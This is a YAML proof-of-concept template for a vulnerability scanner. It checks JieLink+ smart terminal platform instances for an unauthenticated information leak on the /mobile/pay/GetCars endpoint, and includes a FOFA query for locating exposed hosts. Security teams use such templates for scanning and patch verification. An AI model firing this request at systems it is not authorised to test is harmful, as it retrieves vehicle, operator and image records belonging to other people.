id: poc-yaml-jielink-plus-getcars-info-leak
info:
  name: JieLink+智能终端操作平台 GetCars 信息泄露漏洞
  severity: medium
  tags:
  - 信息泄露
  finger: JeLink+
  fofa: title="JieLink+智能终端操作平台"
requests:
- method: GET
  path: /mobile/pay/GetCars?pageIndex=1&pageSize=20
  expression: "status_code == 200 && \ncontains(body,\"\\\"EGUID\\\"\") &&\ncontains(body,\"\
    \\\"OperatorName\\\"\") &&\ncontains(body,\"\\\"EnterPicture\\\"\") &&\ncontains(content_type,\"\
    application/json\")\n"
variables: {}
transport: http
